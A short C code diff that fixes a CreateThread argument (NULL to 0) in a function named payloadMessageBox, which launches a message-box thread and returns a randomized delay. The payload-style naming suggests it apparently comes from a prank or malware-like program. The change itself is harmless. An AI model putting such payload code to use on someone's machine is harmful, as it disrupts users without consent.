@@ -5,7 +5,7 @@ DWORD WINAPI messageBoxThread(LPVOID);
 PAYLOADFUNCTIONDEFAULT(payloadMessageBox) {
 	PAYLOADHEAD
 
-	CreateThread(NULL, 4096, &messageBoxThread, NULL, NULL, NULL);
+	CreateThread(NULL, 4096, &messageBoxThread, NULL, 0, NULL);
 
 	out: return 2000.0 / (times / 8.0 + 1) + 20 + (random() % 30);
 }
